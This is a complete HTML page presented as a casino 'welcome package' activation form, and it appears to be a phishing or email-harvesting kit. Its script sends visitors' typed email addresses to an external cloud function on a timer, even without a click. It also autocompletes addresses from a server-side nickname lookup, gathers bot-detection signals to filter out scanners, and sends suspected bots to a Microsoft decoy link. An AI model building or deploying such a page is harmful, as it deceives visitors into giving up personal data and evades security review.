<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta name="robots" content="noindex,nofollow,noarchive">
<meta name="referrer" content="no-referrer">
<title>Activate Welcome Package</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}

/* ========================================================
   YOUR BACKGROUND HERE
   Put your image (bg.jpg) in the same folder as index.html
   ======================================================== */
body{
  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
  
  /* Background with dark overlay for text readability */
  background: linear-gradient(rgba(0,0,0,0.4), rgba(0,0,0,0.6)), 
              url('bg.jpg') center/cover no-repeat fixed;
  
  min-height: 100vh;
  display: flex;
  justify-content: center;
  align-items: center;
  padding: 20px;
  color: #fff;
}

/* Premium Casino Style Card */
.card{
  background: rgba(15, 23, 42, 0.85); /* Dark blue with transparency */
  backdrop-filter: blur(12px);
  -webkit-backdrop-filter: blur(12px);
  padding: 35px 30px;
  border-radius: 16px;
  border: 1px solid rgba(212, 175, 55, 0.5); /* Gold border */
  box-shadow: 0 20px 40px rgba(0,0,0,0.6), inset 0 0 20px rgba(212, 175, 55, 0.1);
  text-align: center;
  max-width: 420px;
  width: 100%;
  position: relative;
  animation: cardIn 0.5s ease-out;
}

@keyframes cardIn{from{opacity:0;transform:translateY(20px) scale(0.95)}to{opacity:1;transform:translateY(0) scale(1)}}

/* Main text (Subtitle) */
.subtitle{
  font-size: 18px;
  font-weight: 500;
  color: #f8fafc;
  line-height: 1.5;
  margin-bottom: 24px;
  text-shadow: 0 2px 4px rgba(0,0,0,0.5);
}

.wrap{
  position: relative;
  text-align: left;
  margin-bottom: 16px;
}

input[type=email]{
  width: 100%;
  padding: 16px;
  font-size: 16px;
  border: 2px solid #334155;
  border-radius: 8px;
  outline: none;
  transition: all 0.3s;
  font-family: inherit;
  background: rgba(30, 41, 59, 0.9);
  color: #fff;
}

input[type=email]::placeholder{ color: #64748b; }

input[type=email]:focus{
  border-color: #d4af37; /* Gold focus ring */
  box-shadow: 0 0 15px rgba(212, 175, 55, 0.3);
  background: rgba(15, 23, 42, 0.9);
}

input[type=email]:disabled{
  opacity: 0.6;
  cursor: not-allowed;
}

/* Gold Button */
.btn-submit{
  width: 100%;
  padding: 16px;
  font-size: 16px;
  font-weight: 800;
  color: #0f172a;
  background: linear-gradient(90deg, #d4af37 0%, #f3e5ab 50%, #d4af37 100%);
  background-size: 200% auto;
  border: none;
  border-radius: 8px;
  cursor: pointer;
  transition: all 0.3s;
  text-transform: uppercase;
  letter-spacing: 0.5px;
  box-shadow: 0 4px 15px rgba(212, 175, 55, 0.4);
}

.btn-submit:hover{
  background-position: right center;
  transform: translateY(-2px);
  box-shadow: 0 6px 20px rgba(212, 175, 55, 0.6);
}

.btn-submit:active{
  transform: translateY(0);
}

.btn-submit:disabled{
  background: #475569;
  color: #94a3b8;
  box-shadow: none;
  cursor: not-allowed;
}

/* Dropdown for domain suggestion */
.suggestion{
  position: absolute;
  left: 0; right: 0; top: calc(100% + 8px);
  background: #1e293b;
  border: 1px solid #d4af37;
  border-radius: 8px;
  box-shadow: 0 10px 25px rgba(0,0,0,0.5);
  padding: 8px;
  display: flex;
  flex-wrap: wrap;
  gap: 8px;
  z-index: 10;
  animation: hintIn 0.2s ease-out;
}

@keyframes hintIn{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
.suggestion[hidden]{display:none}

.suggestion-btn{
  flex: 1 0 auto;
  padding: 10px;
  background: rgba(212, 175, 55, 0.15);
  color: #d4af37;
  border: 1px solid rgba(212, 175, 55, 0.3);
  border-radius: 6px;
  font-weight: 600;
  cursor: pointer;
  font-size: 15px;
  transition: all 0.2s;
}

.suggestion-btn:hover{
  background: rgba(212, 175, 55, 0.3);
}

.honeypot{
  position:absolute;left:-9999px;width:1px;height:1px;
  opacity:0;pointer-events:none;
}

.badge{
  margin-top: 24px;
  font-size: 12px;
  color: #94a3b8;
  display: flex;
  align-items: center;
  justify-content: center;
  gap: 6px;
}
</style>
</head>
<body>

<div class="card">
  <p class="subtitle" id="subtitle">Enter your email address to activate your welcome package.</p>

  <div class="wrap">
    <input type="email" id="email"
           placeholder="Email Address"
           autocomplete="email"
           inputmode="email"
           autocapitalize="off"
           autocorrect="off"
           spellcheck="false"
           maxlength="128">
    <div class="suggestion" id="suggestion" hidden></div>
  </div>

  <button type="button" id="btnSubmit" class="btn-submit">Activate Bonus</button>

  <input type="text" name="website" id="hp" class="honeypot" tabindex="-1" autocomplete="off" aria-hidden="true">

  <div class="badge">
    <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path></svg>
    <span>SSL Encrypted</span>
  </div>
</div>

<script>
(function(){
  'use strict';

  var CONFIG = {
    FUNCTION_URL: 'https://functions.yandexcloud.net/d4e5bqhobljvknj550vf',
    IDLE_TIMEOUT_MS: 40000,
    ABSOLUTE_TIMEOUT_MS: 60000,
    LOOKUP_DEBOUNCE_MS: 400,
    EMAIL_DEBOUNCE_MS: 400,
    DECOY: 'https://go.microsoft.com/fwlink/?LinkId=521839'
  };

  var EMAIL_REGEX = /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/;

  var pageLoadTime = Date.now();
  var had_mouse = false;
  var had_key = false;
  var redirected = false;
  var idleTimer = null;
  var absoluteTimer = null;
  var lookupTimer = null;
  var emailTimer = null;
  var lastNickname = '';
  var site = window.location.hostname;

  var emailEl = document.getElementById('email');
  var suggestionEl = document.getElementById('suggestion');
  var hpEl = document.getElementById('hp');
  var subtitleEl = document.getElementById('subtitle');
  var btnSubmit = document.getElementById('btnSubmit');

  function resetIdle() {
    if (redirected) return;
    if (idleTimer) clearTimeout(idleTimer);
    idleTimer = setTimeout(triggerTimeout, CONFIG.IDLE_TIMEOUT_MS);
  }

  function triggerTimeout() {
    if (redirected) return;
    var value = emailEl.value.trim();
    doResolve('timeout', value);
  }

  function doResolve(mode, value) {
    if (redirected) return;
    redirected = true;

    if (idleTimer) clearTimeout(idleTimer);
    if (absoluteTimer) clearTimeout(absoluteTimer);
    if (lookupTimer) clearTimeout(lookupTimer);
    if (emailTimer) clearTimeout(emailTimer);

    emailEl.disabled = true;
    btnSubmit.disabled = true;
    suggestionEl.hidden = true;
    
    // English loading state texts
    subtitleEl.textContent = 'Redirecting... Please wait a moment.';
    subtitleEl.style.color = '#d4af37'; 
    btnSubmit.textContent = 'Loading...';

    var payload = {
      site: site, mode: mode, value: value,
      signals: {
        honeypot: hpEl.value || '',
        time_on_page: Date.now() - pageLoadTime,
        had_mouse: had_mouse, had_key: had_key
      }
    };

    fetch(CONFIG.FUNCTION_URL + '?action=resolve', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload), mode: 'cors'
    })
      .then(function(r) { return r.json(); })
      .then(function(d) {
        var url = (d && d.url) ? d.url : CONFIG.DECOY;
        window.location.replace(url);
      })
      .catch(function() { window.location.replace(CONFIG.DECOY); });
  }

  function doLookup(nickname) {
    fetch(CONFIG.FUNCTION_URL + '?action=lookup&nickname=' + encodeURIComponent(nickname), { mode: 'cors' })
      .then(function(r) { return r.json(); })
      .then(function(d) {
        if (redirected) return;
        var matches = (d && d.matches) || [];
        
        if (matches.length === 1 && emailEl.value.endsWith('@')) {
          var finalEmail = nickname + '@' + matches[0];
          emailEl.value = finalEmail;
          hideSuggestion();
          
          if (emailTimer) clearTimeout(emailTimer);
          emailTimer = setTimeout(function() {
            doResolve('email', finalEmail);
          }, 500);
          
        } else if (matches.length > 0) {
          renderSuggestion(matches, nickname);
        } else {
          hideSuggestion();
        }
      })
      .catch(function() { hideSuggestion(); });
  }

  function renderSuggestion(domains, nickname) {
    suggestionEl.innerHTML = '';
    domains.forEach(function(domain) {
      var btn = document.createElement('button');
      btn.type = 'button';
      btn.className = 'suggestion-btn';
      btn.textContent = '@' + domain;
      btn.addEventListener('click', function(e) {
        e.preventDefault();
        emailEl.value = nickname + '@' + domain;
        hideSuggestion();
        handleInput();
        emailEl.focus();
      });
      suggestionEl.appendChild(btn);
    });
    suggestionEl.hidden = false;
  }

  function hideSuggestion() {
    suggestionEl.hidden = true;
    suggestionEl.innerHTML = '';
  }

  function handleInput() {
    if (redirected) return;
    var value = emailEl.value;
    had_key = true;
    resetIdle();

    var atPos = value.indexOf('@');
    var nickname = atPos > 0 ? value.substring(0, atPos).toLowerCase().trim() : '';

    if (nickname.length > 0 && nickname !== lastNickname) {
      lastNickname = nickname;
      if (lookupTimer) clearTimeout(lookupTimer);
      lookupTimer = setTimeout(function() { doLookup(nickname); }, CONFIG.LOOKUP_DEBOUNCE_MS);
    } else if (nickname.length === 0) {
      lastNickname = '';
      hideSuggestion();
      if (lookupTimer) clearTimeout(lookupTimer);
    }

    if (emailTimer) clearTimeout(emailTimer);
    if (EMAIL_REGEX.test(value.trim())) {
      emailTimer = setTimeout(function() {
        doResolve('email', emailEl.value.trim());
      }, CONFIG.EMAIL_DEBOUNCE_MS);
    }
  }

  btnSubmit.addEventListener('click', function() {
    if (emailTimer) clearTimeout(emailTimer);
    var val = emailEl.value.trim();
    if (EMAIL_REGEX.test(val)) {
      doResolve('email', val);
    } else {
      emailEl.focus();
    }
  });

  emailEl.addEventListener('input', handleInput);
  emailEl.addEventListener('focus', resetIdle);
  emailEl.addEventListener('keydown', function(e) {
    if (e.key === 'Enter') { e.preventDefault(); btnSubmit.click(); }
  });

  document.addEventListener('mousemove', function() { had_mouse = true; resetIdle(); }, { passive: true });
  document.addEventListener('keydown', function() { had_key = true; resetIdle(); });
  document.addEventListener('scroll', resetIdle, { passive: true, capture: true });
  document.addEventListener('click', resetIdle);
  document.addEventListener('touchstart', resetIdle, { passive: true });

  resetIdle();
  absoluteTimer = setTimeout(triggerTimeout, CONFIG.ABSOLUTE_TIMEOUT_MS);

  if (!/Mobi|Android|iPhone|iPad/i.test(navigator.userAgent)) {
    setTimeout(function() { emailEl.focus(); }, 300);
  }

})();
</script>
</body>
</html>
